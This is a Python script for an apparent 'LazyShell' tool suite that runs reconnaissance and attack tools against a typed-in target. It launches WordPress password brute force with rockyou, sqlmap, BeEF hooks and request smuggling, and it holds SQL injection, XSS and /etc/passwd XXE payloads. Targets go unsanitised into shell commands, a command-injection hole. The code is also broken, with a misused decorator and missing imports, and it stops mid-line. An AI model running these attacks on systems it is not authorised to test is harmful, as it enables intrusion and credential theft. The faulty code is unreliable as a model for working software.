#!/usr/bin/python3

import os
import time
import socket
import argparse
from concurrent.futures import ThreadPoolExecutor

class LazyShell:
    def __init__(self):
        self.tools_menu = {
            '1': {'name': 'Nmap', 'cmd': self.nmap_scan},
            '2': {'name': 'Nikto', 'cmd': self.nikto_scan},
            '3': {'name': 'Snmp-check', 'cmd': self.snmp_check},
            '4': {'name': 'Dnsrecon', 'cmd': self.dns_recon},
            '5': {'name': 'Subdomain Brute Force', 'cmd': self.sub_brute},
            '6': {'name': 'Web Content Discovery', 'cmd': self.content_discovery},
            '7': {'name': 'Sqlmap', 'cmd': self.sqlmap_test},
            '8': {'name': 'Brutemap', 'cmd': self.brutemap},
            '9': {'name': 'Admin Finder', 'cmd': self.admin_finder},
            '10': {'name': 'WordPress Login Brute Force', 'cmd': self.wp_brute},
            '11': {'name': 'JoomScan', 'cmd': self.joomscan},
            '12': {'name': 'Dirsearch', 'cmd': self.dirsearch},
            '13': {'name': 'Request Smuggler', 'cmd': self.request_smuggler},
            '14': {'name': 'Zap Baseline Scan', 'cmd': self.zap_scan},
            '15': {'name': 'XSSTracer', 'cmd': self.xss_tracer},
            '16': {'name': 'HttProbe', 'cmd': self.httprobe},
            '17': {'name': 'Port Scanner', 'cmd': self.port_scanner},
            '18': {'name': 'Traceroute', 'cmd': self.traceroute},
            '19': {'name': 'Netdiscover', 'cmd': self.netdiscover},
            '20': {'name': 'Wireshark Live Capture', 'cmd': self.wireshark_live},
            '21': {'name': 'BeEF Hook Inject', 'cmd': self.beef_hook},
            '22': {'name': 'SQL Injection Tester', 'cmd': self.sqli_tester},
            '23': {'name': 'XSS Validator', 'cmd': self.xss_validator},
            '24': {'name': 'XXE Injector', 'cmd': self.xxe_injector},
            '25': {'name': 'Masscan Continuous Monitor', 'cmd': self.masscan_monitor}
        }

    def start_interface(self):
        while True:
            os.system('clear' if os.name != 'nt' else 'cls')
            print("="*50)
            print("LazyShell v1.0 - Repeater Tool Suite")
            print("="*50)
            print("\nAvailable Tools:")
            
            for key, val in self.tools_menu.items():
                print(f"[{key}] {val['name']}")
            
            choice = input("\nEnter tool number or exit to quit: ")
            
            if choice.lower() == "exit":
                break
                
            elif choice in self.tools_menu:
                target = input("Enter target: ")
                self.tools_menu[choice]['cmd'](target)
              
    def with_error_handling(self, func):
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                print(f"\nError executing tool: {str(e)}")
                time.sleep(2)
        return wrapper
        
    @with_error_handling
    def nmap_scan(self, target):
        common_ports = "21-25,80,443,3306,8080"
        cmd = f"nmap -T4 -A -v {target} -p {common_ports}"
        os.system(cmd)

    @with_error_handling
    def nikto_scan(self, target):
        cmd = f"nikto -h {target}"
        os.system(cmd)

    @with_error_handling
    def snmp_check(self, target):
        cmd = f"snmp-check {target}"
        os.system(cmd)

    @with_error_handling
    def dns_recon(self, target):
        cmd = f"dnsrecon -d {target} -z"
        os.system(cmd)

    @with_error_handling
    def sub_brute(self, domain):
        cmds = [
            f"gobuster dir -u https://{domain}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            f"subfinder -d {domain}",
            f"assetfinder --subs-only {domain}"
        ]
        for c in cmds:
            os.system(c)

    @with_error_handling
    def content_discovery(self, url):
        cmd = f"gobuster dir -u {url} -w /usr/share/seclists/Discovery/Web-Content/common.txt"
        os.system(cmd)

    @with_error_handling
    def sqlmap_test(self, url):
        cmd = f"sqlmap -u {url} --batch --random-agent"
        os.system(cmd)

    @with_error_handling
    def brutemap(self, target):
        cmd = f"brutemap --host {target}"
        os.system(cmd)

    @with_error_handling
    def admin_finder(self, domain):
        cmd = f"gobuster dir -u http://{domain}/ -w /usr/share/wordlists/admin-finder-wordlist.txt"
        os.system(cmd)

    @with_error_handling
    def wp_brute(self, domain):
        cmd = f"wpscan --url http://{domain} -U /usr/share/wordlists/usernames-top1000.txt -P /usr/share/wordlists/rockyou.txt --max-threads 50"
        os.system(cmd)

    @with_error_handling
    def joomscan(self, url):
        cmd = f"joomscan {url}"
        os.system(cmd)

    @with_error_handling
    def dirsearch(self, url):
        cmd = f"dirsearch -u {url} -e php,asp,jsp"
        os.system(cmd)

    @with_error_handling
    def request_smuggler(self, target):
        cmd = f"./request-smuggler.sh {target}"
        os.system(cmd)

    @with_error_handling
    def zap_scan(self, target):
        cmd = f"zap-baseline.py -t http://{target}/ -r {target}_report.html"
        os.system(cmd)

    @with_error_handling
    def xss_tracer(self, url):
        cmd = f"xss-tracer --url {url} --auto"
        os.system(cmd)

    @with_error_handling
    def httprobe(self, wordlist):
        with ThreadPoolExecutor(max_workers=50) as executor:
            cmd = f"cat {wordlist} | httprobe -c 50"
            os.system(cmd)

    @with_error_handling
    def port_scanner(self, target):
        cmd = f"netcat -nvz {target} 1-1000"
        os.system(cmd)

    @with_error_handling
    def traceroute(self, target):
        cmd = f"traceroute {target}"
        os.system(cmd)

    @with_error_handling
    def netdiscover(self, subnet):
        cmd = f"netdiscover -r {subnet}/24"
        os.system(cmd)

    @with_error_handling
    def wireshark_live(self, interface=None):
        if not interface:
            interfaces = subprocess.check_output("iwconfig").decode().split('\n')[0].split()
            interface = interfaces[0] if interfaces else "eth0"
        cmd = f"wireshark -i {interface}"
        os.system(cmd)

    @with_error_handling
    def beef_hook(self, target):
        cmd = f"beef-xss {target}"
        os.system(cmd)

    @with_error_handling
    def sqli_tester(self, url):
        payload = "' OR '1'='1"
        cmd = f"curl -s '{url}{payload}'"
        response = os.popen(cmd).read()
        if "error" in response.lower() or "mysql" in response.lower():
            print("[+] Possible SQL injection vulnerability detected")
        else:
            print("[-] No obvious SQL injection vulnerabilities found")

    @with_error_handling
    def xss_validator(self, url):
        payloads = ["<script>alert(1)</script>", "\"onmouseover=\"alert(1)\""]
        vulnerable = False
        
        for p in payloads:
            cmd = f"curl -s '{url}{p}'"
            result = subprocess.check_output(cmd, shell=True).decode()
            
            if p in result:
                print(f"[+] XSS vulnerability detected with payload: {p}")
                vulnerable = True
                
        if not vulnerable:
            print("[-] No XSS vulnerabilities detected")

    @with_error_handling
    def xxe_injector(self, url):
        payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
        headers = {"Content-Type": "application/xml"}
        
        req = requests.post(url, data=payload, headers=headers)
        if "/bin/bash" in req.text:
            print("[+] XXE vulnerability detected")
        else:
            print("[-] No XXE vulnerability detected")

    @with_error_handling
    def masscan_monitor(self, range="192